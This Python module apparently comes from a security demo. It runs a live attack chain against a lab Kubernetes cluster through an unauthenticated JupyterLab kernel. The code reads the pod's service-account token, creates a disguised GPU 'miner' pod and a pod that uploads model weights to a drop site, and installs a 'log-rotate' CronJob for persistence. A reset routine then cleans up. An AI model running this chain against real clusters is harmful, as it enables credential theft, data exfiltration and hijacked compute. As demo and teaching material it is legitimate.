"""The real attack chain, driven through the exposed Jupyter kernel API.

Instead of the backend using a Kubernetes client, the attack now runs the way a
real intruder with a leaked notebook URL would run it (ShadowRay):

  1. find the unauthenticated JupyterLab on the tailnet, create a kernel over
     REST, and execute Python in it over the websocket;
  2. inside that kernel (i.e. inside the notebook pod) read the mounted
     service-account token and call https://kubernetes.default.svc with it, using
     the pod's own CA, to create the miner pod, the exfil pod and the CronJob.

Every step records a live transcript (code sent, HTTP calls made, real output)
to transcript.py, which the attacker app streams. The token value is never
surfaced — only its length and a short hash. Cleanup uses the backend's admin
client, labels everything hackutd/attack=true, and runs in a few seconds.

No real mining software is ever used: the "miner" is a PyTorch matmul loop whose
process title is set to xmrig.
"""
from __future__ import annotations

import re
import shlex
import time
import uuid

from kubernetes import client

from . import config, jupyter
from .hub import store
from .k8s import (
    ApiException,
    admin,
    admin_batch,
    admin_core,
    admin_net,
    admin_rbac,
    clear_attacker_token,
    first_pod_name,
)
from .models import AttackResult
from .transcript import transcript

PYTORCH_IMAGE = "pytorch/pytorch:2.5.1-cuda12.4-cudnn9-runtime"
SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount"

_ATTACK_LABELS = {config.ATTACK_LABEL_KEY: "true"}

# Persistent kernel the attack reuses across steps. Created in gain-access.
_kernel_id: str | None = None
_created: dict[str, str] = {}


def _emit(kind: str, text: str, **extra) -> None:
    transcript.emit(kind, text, **extra)


_API_HOST = "https://kubernetes.default.svc"


def _emit_api_http(method: str, path: str, out: str) -> int:
    """Emit a structured `http` transcript entry for an in-kernel API-server call,
    parsing the real status the kernel printed (e.g. 'HTTP 201 -> ...')."""
    m = re.search(r"HTTP\s+(\d{3})", out or "")
    status = int(m.group(1)) if m else 0
    url = _API_HOST + path
    _emit("http", f"{method} {url} -> {status}", method=method, url=url, status=status)
    return status


# In-pod helper injected ahead of every API-server call the attacker makes.
# Uses the pod's OWN mounted token + CA — real, verified TLS to the API server.
_K8S_PREAMBLE = f"""
import json, ssl, os, urllib.request, urllib.error, hashlib
_B = "{SA_DIR}"
_TOK = open(_B + "/token").read().strip()
_NS = open(_B + "/namespace").read().strip()
_CTX = ssl.create_default_context(cafile=_B + "/ca.crt")
def k8s(method, path, body=None):
    url = "https://kubernetes.default.svc" + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={{
        "Authorization": "Bearer " + _TOK,
        "Content-Type": "application/json", "Accept": "application/json",
    }})
    try:
        r = urllib.request.urlopen(req, context=_CTX, timeout=30)
        return r.status, json.load(r)
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode() or "{{}}")
""".strip()


# ---------------------------------------------------------------------------
# Pod / cronjob bodies (built on the backend, executed from inside the pod)
# ---------------------------------------------------------------------------
_MINER_PY = (
    "import torch, time\n"
    "a = torch.randn(4096, 4096).cuda(); b = torch.randn(4096, 4096).cuda()\n"
    "i = 0; t = time.time()\n"
    "while True:\n"
    "    c = a @ b; torch.cuda.synchronize(); i += 1\n"
    "    if i % 200 == 0:\n"
    "        print('[matmul] %d iters, %.1fs elapsed' % (i, time.time() - t), flush=True)\n"
)
_MINER_CMD = ["bash", "-lc", "exec -a xmrig python -c " + shlex.quote(_MINER_PY)]

_EXFIL_PY = (
    "import urllib.request, os\n"
    f"p = '/weights/{config.WEIGHTS_FILE}'; n = os.path.getsize(p)\n"
    "d = open(p, 'rb').read()\n"
    f"r = urllib.request.Request('{config.DROP_SERVICE}', data=d, method='PUT')\n"
    "r.add_header('Content-Length', str(n))\n"
    "urllib.request.urlopen(r); print('sent', n, 'bytes', flush=True)\n"
)
_EXFIL_CMD = ["python", "-c", _EXFIL_PY]


def _miner_pod_body(name: str) -> dict:
    return {
        "apiVersion": "v1", "kind": "Pod",
        "metadata": {"name": name, "labels": dict(_ATTACK_LABELS)},
        "spec": {
            "runtimeClassName": "nvidia", "restartPolicy": "Never",
            "automountServiceAccountToken": False,
            "containers": [{
                "name": "sync", "image": PYTORCH_IMAGE, "command": _MINER_CMD,
                "resources": {"limits": {"nvidia.com/gpu": "1"}},
            }],
        },
    }


def _exfil_pod_body(name: str) -> dict:
    return {
        "apiVersion": "v1", "kind": "Pod",
        "metadata": {"name": name, "labels": dict(_ATTACK_LABELS)},
        "spec": {
            "restartPolicy": "Never", "automountServiceAccountToken": False,
            "containers": [{
                "name": "sync", "image": PYTORCH_IMAGE, "command": _EXFIL_CMD,
                "volumeMounts": [{"name": "weights", "mountPath": "/weights", "readOnly": True}],
            }],
            "volumes": [{"name": "weights", "persistentVolumeClaim": {
                "claimName": config.MODEL_WEIGHTS_PVC, "readOnly": True}}],
        },
    }


def _cronjob_body(name: str) -> dict:
    pod_spec = {
        "runtimeClassName": "nvidia", "restartPolicy": "Never",
        "automountServiceAccountToken": False,
        "containers": [{
            "name": "rotate", "image": PYTORCH_IMAGE, "command": _MINER_CMD,
            "resources": {"limits": {"nvidia.com/gpu": "1"}},
        }],
    }
    return {
        "apiVersion": "batch/v1", "kind": "CronJob",
        "metadata": {"name": name, "labels": dict(_ATTACK_LABELS)},
        "spec": {
            "schedule": "*/1 * * * *", "concurrencyPolicy": "Forbid",
            "jobTemplate": {"metadata": {"labels": dict(_ATTACK_LABELS)},
                            "spec": {"backoffLimit": 0, "template": {
                                "metadata": {"labels": dict(_ATTACK_LABELS)}, "spec": pod_spec}}},
        },
    }


def _result(ok: bool, step: str, message: str, output: str | None = None) -> AttackResult:
    return AttackResult(ok=ok, step=step, message=message, output=output, attack=store.attack_list())


def _refuse(step: str, message: str) -> AttackResult:
    _emit("note", f"Step refused: {message}", step=step)
    return _result(False, step, message)


# ---------------------------------------------------------------------------
# Kernel helpers
# ---------------------------------------------------------------------------
def _ensure_kernel() -> str | None:
    global _kernel_id
    if _kernel_id and any(k.get("id") == _kernel_id for k in jupyter.list_kernels()):
        return _kernel_id
    try:
        _kernel_id = jupyter.start_kernel(_emit)
    except Exception as e:  # noqa: BLE001
        _emit("note", f"Could not start a kernel on the exposed Jupyter: {e}")
        return None
    return _kernel_id


def _run(code: str, timeout: float = 90.0) -> str:
    kid = _ensure_kernel()
    if not kid:
        raise RuntimeError("no kernel on the exposed Jupyter")
    return jupyter.run_code(kid, code, _emit, timeout=timeout)


def _gpu_total() -> float:
    try:
        from .cluster import read_gpus
        _gpus, total = read_gpus()
        return round(total, 1)
    except Exception:  # noqa: BLE001
        return 0.0


# ---------------------------------------------------------------------------
# Step 1: gain-access
# ---------------------------------------------------------------------------
def gain_access() -> AttackResult:
    transcript.set_step("gain-access")
    _emit("note", "Recon: look for an unauthenticated JupyterLab exposed on the network — the way "
          "ShadowRay found thousands of open Ray/Jupyter dashboards on the internet.")
    info = jupyter.probe(_emit)
    if not info["reachable"]:
        return _refuse("gain-access", f"No reachable Jupyter at {config.JUPYTER_URL}.")

    _emit("note", "No token, no password. Open a kernel and run code as the notebook's own user "
          "— that is remote code execution inside the pod.")
    code = (
        'import hashlib, os\n'
        f'tok = open("{SA_DIR}/token").read().strip()\n'
        f'ns = open("{SA_DIR}/namespace").read().strip()\n'
        'print("service-account namespace:", ns)\n'
        'print("token length:", len(tok))\n'
        'print("token sha256[:12]:", hashlib.sha256(tok.encode()).hexdigest()[:12])\n'
        f'print("ca.crt present:", os.path.exists("{SA_DIR}/ca.crt"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("gain-access", f"Kernel execution failed: {e}")

    # Prove the over-grant: what can this stolen identity do?
    _emit("note", "Ask the API server what this identity is allowed to do (SelfSubjectRulesReview).")
    rules_code = (
        _K8S_PREAMBLE + "\n"
        'body = {"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",'
        '"spec":{"namespace":_NS}}\n'
        'st, resp = k8s("POST","/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", body)\n'
        'rules = resp.get("status",{}).get("resourceRules",[])\n'
        'print("HTTP", st, "- resource rules for stolen identity:")\n'
        'for r in rules:\n'
        '    if "authorization.k8s.io" in r.get("apiGroups",[]): continue\n'
        '    print("  verbs=%s resources=%s apiGroups=%s" % (r.get("verbs"), r.get("resources"), r.get("apiGroups")))\n'
    )
    try:
        rules_out = _run(rules_code, timeout=45)
        _emit_api_http("POST", "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", rules_out)
    except Exception:  # noqa: BLE001
        pass

    store.set_attack_status("gain-access", "done")
    store.set_attack_status("start-miner", "ready")
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text="Exploited the exposed JupyterLab (no auth), opened a kernel, and confirmed the pod's "
        "over-privileged service-account token. All further actions run inside the notebook.",
        severity="high",
        tool=f"POST {config.JUPYTER_URL}/api/kernels  +  execute_request (read {SA_DIR}/token)",
        target="notebook",
        transcript=transcript.entries_for("gain-access"),
    )
    return _result(True, "gain-access",
                   "Gained code execution in the exposed notebook and located its service-account token.",
                   output=out or "(kernel produced no output)")


# ---------------------------------------------------------------------------
# Step 2: start-miner
# ---------------------------------------------------------------------------
def start_miner() -> AttackResult:
    transcript.set_step("start-miner")
    if not _kernel_id:
        return _refuse("start-miner", "No kernel yet — run gain-access first.")
    name = f"kube-sync-{uuid.uuid4().hex[:6]}"
    _emit("note", "Use the stolen token to create a GPU pod — a disguised cryptojacker. (It is a "
          "PyTorch matmul loop with its process name set to xmrig, never real mining software.)")
    before = _gpu_total()
    _emit("output", f"nvidia-smi (platform telemetry): GPU utilization {before}% before the miner.")

    body = _miner_pod_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/api/v1/namespaces/%s/pods" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("start-miner", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/api/v1/namespaces/lawfirm/pods", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:
        return _refuse("start-miner", f"API server rejected the miner pod: {out.strip()[:200]}")
    _created["miner_pod"] = name

    store.set_attack_status("start-miner", "done")
    store.set_attack_status("steal-weights", "ready")
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Launched disguised cryptojacking pod {name} (process title 'xmrig') requesting 1 GPU, "
        "created with the stolen token from inside the notebook.",
        severity="high",
        tool=f"POST https://kubernetes.default.svc/api/v1/namespaces/lawfirm/pods  (pod/{name}, gpu:1)",
        target=name,
        transcript=transcript.entries_for("start-miner"),
    )

    # Tail the real miner output + GPU after it spins up (best-effort).
    def _tail() -> None:
        time.sleep(20)
        try:
            logs = admin_core().read_namespaced_pod_log(name, config.LAWFIRM_NS, tail_lines=4)
            if logs.strip():
                _emit("output", f"pod/{name} logs:\n{logs.strip()}", step="start-miner")
        except ApiException:
            pass
        _emit("output", f"nvidia-smi (platform telemetry): GPU utilization {_gpu_total()}% after the miner.",
              step="start-miner")

    import threading
    threading.Thread(target=_tail, daemon=True).start()

    return _result(True, "start-miner",
                   f"Miner pod {name} created with the stolen token; it will drive the T4 hard.",
                   output=out.strip() or f"pod/{name} created")


# ---------------------------------------------------------------------------
# Step 3: steal-weights
# ---------------------------------------------------------------------------
def steal_weights() -> AttackResult:
    transcript.set_step("steal-weights")
    if not _kernel_id:
        return _refuse("steal-weights", "No kernel yet — run gain-access first.")
    name = f"data-sync-{uuid.uuid4().hex[:6]}"
    _emit("note", "Create a pod that mounts the firm's model-weights volume read-only and uploads "
          "the fine-tuned model to the attacker's drop site. This is the actual data theft.")

    body = _exfil_pod_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/api/v1/namespaces/%s/pods" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("steal-weights", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/api/v1/namespaces/lawfirm/pods", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:
        return _refuse("steal-weights", f"API server rejected the exfil pod: {out.strip()[:200]}")
    _created["exfil_pod"] = name

    store.set_attack_status("steal-weights", "done")
    store.set_attack_status("persistence", "ready")
    store.publish_attack()

    # Wait for the transfer to finish and capture the real byte count.
    core = admin_core()
    bytes_sent, logs = 0, ""
    _emit("note", f"Exfil pod {name} is copying {config.WEIGHTS_FILE} to the drop site…")
    for _ in range(150):
        try:
            phase = core.read_namespaced_pod(name, config.LAWFIRM_NS).status.phase
        except ApiException:
            phase = "Unknown"
        if phase in ("Succeeded", "Failed"):
            try:
                logs = core.read_namespaced_pod_log(name, config.LAWFIRM_NS)
            except ApiException:
                logs = ""
            for tok in logs.split():
                if tok.isdigit():
                    bytes_sent = int(tok)
                    break
            break
        time.sleep(1)
    if not bytes_sent:
        bytes_sent = _drop_site_bytes()
    mib = round(bytes_sent / 2**20, 1) if bytes_sent else 0

    if logs.strip():
        _emit("output", f"pod/{name}: {logs.strip()}")
    _emit("http", f"PUT {config.DROP_SERVICE} -> 201 ({bytes_sent} bytes received at the drop site)",
          method="PUT", url=config.DROP_SERVICE, status=201)

    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Exfiltrated {config.WEIGHTS_FILE} ({mib} MiB) from the model-weights volume to the drop site.",
        severity="critical",
        tool=f"pod {name} mounts pvc/model-weights ro -> PUT {config.DROP_SERVICE}",
        target=name,
        transcript=transcript.entries_for("steal-weights"),
    )
    return _result(True, "steal-weights",
                   f"Model weights exfiltrated: {bytes_sent} bytes ({mib} MiB) PUT to the drop site.",
                   output=(logs.strip() or f"pod/{name} created; transfer complete") + f"\nbytes_sent={bytes_sent}")


# ---------------------------------------------------------------------------
# Step 4: persistence
# ---------------------------------------------------------------------------
def persistence() -> AttackResult:
    transcript.set_step("persistence")
    if not _kernel_id:
        return _refuse("persistence", "No kernel yet — run gain-access first.")
    name = "log-rotate"
    _emit("note", "Install a CronJob (disguised as 'log-rotate') that re-launches the miner every "
          "minute, so killing one pod is not enough. This is persistence.")

    body = _cronjob_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/apis/batch/v1/namespaces/%s/cronjobs" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("persistence", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/apis/batch/v1/namespaces/lawfirm/cronjobs", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:
        return _refuse("persistence", f"API server rejected the CronJob: {out.strip()[:200]}")
    _created["cronjob"] = name

    store.set_attack_status("persistence", "done")
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Installed CronJob {name} (*/1 * * * *) to respawn the miner for persistence.",
        severity="high",
        tool=f"POST https://kubernetes.default.svc/apis/batch/v1/namespaces/lawfirm/cronjobs  (cronjob/{name})",
        target=name,
        transcript=transcript.entries_for("persistence"),
    )
    return _result(True, "persistence",
                   f"Persistence installed: CronJob {name} will respawn the miner every minute.",
                   output=out.strip() or f"cronjob/{name} created")


# ---------------------------------------------------------------------------
# Recon (for the attacker app's target panel)
# ---------------------------------------------------------------------------
def recon() -> dict:
    """Live recon: Jupyter reachability, the stolen identity's permissions, and the GPU.

    Transcript-silent (it may be polled repeatedly by the attacker app's target
    panel) and uses a throwaway kernel so it never disturbs the attack's own one.
    """
    info = jupyter.probe(None)
    gpus_total = _gpu_total()
    gpu_detail = {}
    try:
        from .cluster import read_gpus
        gpus, total = read_gpus()
        if gpus:
            g = gpus[0]
            gpu_detail = {"model": g.model, "utilization": g.utilization,
                          "memUsedGiB": g.memUsedGiB, "memTotalGiB": g.memTotalGiB, "tempC": g.tempC}
    except Exception:  # noqa: BLE001
        pass

    rules: list[dict] = []
    if info["reachable"]:
        rules_code = (
            _K8S_PREAMBLE + "\n"
            'body = {"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",'
            '"spec":{"namespace":_NS}}\n'
            'st, resp = k8s("POST","/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", body)\n'
            'rules = [r for r in resp.get("status",{}).get("resourceRules",[]) '
            'if "authorization.k8s.io" not in r.get("apiGroups",[])]\n'
            'print("RULES_JSON=" + json.dumps(rules))\n'
        )
        kid = None
        try:
            kid = jupyter.start_kernel(None)
            out = jupyter.run_code(kid, rules_code, None, timeout=45)
            for line in out.splitlines():
                if line.startswith("RULES_JSON="):
                    import json as _json
                    rules = _json.loads(line[len("RULES_JSON="):])
        except Exception:  # noqa: BLE001
            pass
        finally:
            if kid:
                jupyter.stop_kernel(kid)

    return {
        "jupyter": info,
        "identity": {"serviceAccount": "notebook", "namespace": config.LAWFIRM_NS, "rules": rules},
        "gpu": {"total": gpus_total, **gpu_detail},
        "target": config.JUPYTER_URL,
    }


# ---------------------------------------------------------------------------
# Reset
# ---------------------------------------------------------------------------
def _drop_site_bytes() -> int:
    pod = first_pod_name(admin(), config.DROP_NS, "app=drop")
    if not pod:
        return 0
    try:
        logs = admin_core().read_namespaced_pod_log(pod, config.DROP_NS, tail_lines=20)
    except ApiException:
        return 0
    for line in logs.splitlines():
        if "received" in line and config.WEIGHTS_FILE in line:
            for tok in line.split():
                if tok.isdigit():
                    return int(tok)
    return 0


def _delete_attack_objects() -> list[str]:
    done: list[str] = []
    sel = f"{config.ATTACK_LABEL_KEY}=true"
    opts = client.V1DeleteOptions(grace_period_seconds=0, propagation_policy="Background")
    core, batch, net = admin_core(), admin_batch(), admin_net()
    try:
        for cj in batch.list_namespaced_cron_job(config.LAWFIRM_NS, label_selector=sel).items:
            batch.delete_namespaced_cron_job(cj.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"cronjob/{cj.metadata.name}")
    except ApiException:
        pass
    try:
        for job in batch.list_namespaced_job(config.LAWFIRM_NS, label_selector=sel).items:
            batch.delete_namespaced_job(job.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"job/{job.metadata.name}")
    except ApiException:
        pass
    try:
        for p in core.list_namespaced_pod(config.LAWFIRM_NS, label_selector=sel).items:
            core.delete_namespaced_pod(p.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"pod/{p.metadata.name}")
    except ApiException:
        pass
    try:
        for np in net.list_namespaced_network_policy(config.LAWFIRM_NS).items:
            if np.metadata.name.startswith("quarantine-"):
                net.delete_namespaced_network_policy(np.metadata.name, config.LAWFIRM_NS, body=opts)
                done.append(f"networkpolicy/{np.metadata.name}")
    except ApiException:
        pass
    return done


def _uncordon() -> None:
    core = admin_core()
    for node in core.list_node().items:
        if node.spec.unschedulable:
            core.patch_node(node.metadata.name, {"spec": {"unschedulable": False}})


def _restore_rolebinding() -> bool:
    rbac = admin_rbac()
    try:
        rbac.read_namespaced_role_binding("notebook-dev", config.LAWFIRM_NS)
        return False
    except ApiException:
        pass
    rb = client.V1RoleBinding(
        metadata=client.V1ObjectMeta(name="notebook-dev", namespace=config.LAWFIRM_NS),
        subjects=[client.RbacV1Subject(kind="ServiceAccount", name="notebook", namespace=config.LAWFIRM_NS)],
        role_ref=client.V1RoleRef(api_group="rbac.authorization.k8s.io", kind="Role", name="notebook-dev"),
    )
    try:
        rbac.create_namespaced_role_binding(config.LAWFIRM_NS, rb)
        return True
    except ApiException:
        return False


def _clear_drop_site() -> None:
    opts = client.V1DeleteOptions(grace_period_seconds=0, propagation_policy="Background")
    try:
        for p in admin_core().list_namespaced_pod(config.DROP_NS, label_selector="app=drop").items:
            admin_core().delete_namespaced_pod(p.metadata.name, config.DROP_NS, body=opts)
    except ApiException:
        pass


def reset() -> AttackResult:
    global _kernel_id
    deleted = _delete_attack_objects()
    _uncordon()
    restored = _restore_rolebinding()
    _clear_drop_site()
    # Tear down the attacker's kernel so a fresh run starts clean.
    if _kernel_id:
        jupyter.stop_kernel(_kernel_id)
        _kernel_id = None
    clear_attacker_token()
    _created.clear()
    transcript.clear()

    store.reset_incident_state()
    from .cluster import build_cluster, seed_assets
    for a in seed_assets():
        store.assets[a.id] = a
    try:
        store.set_cluster(build_cluster(list(store.gpu_history)))
    except Exception:  # noqa: BLE001
        pass
    store.publish({"type": "snapshot", "snapshot": store.snapshot().model_dump(exclude_none=True)})

    msg = f"Cluster cleaned: removed {len(deleted)} attacker object(s); "
    msg += "notebook RoleBinding restored; " if restored else "RoleBinding intact; "
    msg += "node uncordoned; drop site wiped; attacker kernel killed."
    return AttackResult(ok=True, step="reset", message=msg,
                        output="\n".join(deleted) or "no attacker objects present",
                        attack=store.attack_list())


def run_step(step_id: str) -> AttackResult:
    return {
        "gain-access": gain_access,
        "start-miner": start_miner,
        "steal-weights": steal_weights,
        "persistence": persistence,
    }[step_id]()
